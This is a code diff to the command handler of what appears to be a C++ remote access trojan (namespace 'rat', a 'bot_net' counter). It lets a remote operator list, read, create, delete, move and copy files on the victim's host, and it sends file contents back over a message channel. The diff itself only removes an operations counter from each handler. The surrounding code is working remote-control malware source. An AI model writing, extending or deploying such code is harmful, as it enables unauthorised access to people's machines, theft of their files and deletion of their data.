@@ -10,31 +10,26 @@ namespace rat::handler {
 void Handler::handlePwdCommand() {
   const auto &current_path = std::filesystem::current_path();
   this->sendMessage(current_path.string());
-  this->bot_net_ops_counter++;
   return;
 }
 
 void Handler::handleCdCommand() {
   if (command.parameters.empty()) {
     this->sendMessage("No path specified");
-    this->bot_net_ops_counter++;
     return;
   }
   this->sendMessage(
       rat::system::cd(rat::system::normalizePath(command.parameters[0])));
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleLsCommand() {
   std::string path = command.parameters.empty() ? "" : command.parameters[0];
   this->sendMessage(rat::system::ls(rat::system::normalizePath(path)));
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleReadCommand() {
   if (command.parameters.empty()) {
     this->sendMessage("No file specified");
-    this->bot_net_ops_counter++;
     return;
   }
   const std::vector<std::string> &params = command.parameters;
@@ -47,8 +42,6 @@ void Handler::handleReadCommand() {
       if (std::filesystem::file_size(file_path) > 4 * KB) {
         this->sendMessage("File too large to be sent as a message, use "
                           "/get instead");
-
-        this->bot_net_ops_counter++;
         return;
       }
       try {
@@ -59,19 +52,15 @@ void Handler::handleReadCommand() {
             fmt::format("Failed to read file{}", file_path.string());
         HANDLER_ERROR_LOG(message);
         this->sendMessage(message);
-        this->bot_net_ops_counter++;
       }
       return;
     } else if (!is_regular_file) {
       this->sendMessage(
           fmt::format("Path: {} is not a file", file_path.string()));
-      this->bot_net_ops_counter++;
       return;
     } else if (!file_exists) {
       this->sendMessage(
           fmt::format("Path: {} does not exist", file_path.string()));
-
-      this->bot_net_ops_counter++;
       return;
     }
   }
@@ -89,15 +78,11 @@ void Handler::handleTouchCommand() {
                            success ? "created" : "not created");
   }
   this->sendMessage(response);
-
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleStatCommand() {
   if (command.parameters.empty()) {
     this->sendMessage("No file specified");
-
-    this->bot_net_ops_counter++;
     return;
   }
 
@@ -105,8 +90,6 @@ void Handler::handleStatCommand() {
   if (!std::filesystem::exists(p)) {
     this->sendMessage(
         fmt::format("File does not exist: {}", command.parameters[0]));
-
-    this->bot_net_ops_counter++;
     return;
   }
 
@@ -115,15 +98,11 @@ void Handler::handleStatCommand() {
       std::filesystem::file_size(p),
       std::filesystem::last_write_time(p).time_since_epoch().count());
   this->sendMessage(result);
-
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleRmCommand() {
   if (command.parameters.empty()) {
     this->sendMessage("No file specified");
-
-    this->bot_net_ops_counter++;
     return;
   }
 
@@ -140,7 +119,6 @@ void Handler::handleRmCommand() {
                             success ? "removed" : "not removed");
   }
   this->sendMessage(response);
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleMvCommand() {
@@ -156,8 +134,6 @@ void Handler::handleMvCommand() {
   if (!std::filesystem::exists(source_path)) {
     this->sendMessage(
         fmt::format("Source path {} does not exist", source_path.string()));
-
-    this->bot_net_ops_counter++;
     return;
   }
 
@@ -188,15 +164,11 @@ void Handler::handleMvCommand() {
     }
   }
   this->sendMessage(result);
-
-  this->bot_net_ops_counter++;
 }
 
 void Handler::handleCpCommand() {
   if (command.parameters.size() < 2) {
     this->sendMessage("Usage: /cp <src> <dest>");
-
-    this->bot_net_ops_counter++;
     return;
   }
 
@@ -235,7 +207,6 @@ void Handler::handleCpCommand() {
                                   source_path.string(), dist_path.string()));
   }
 }
-
 } // namespace rat::handler
 
 #undef HANDLER_DEBUG_LOG
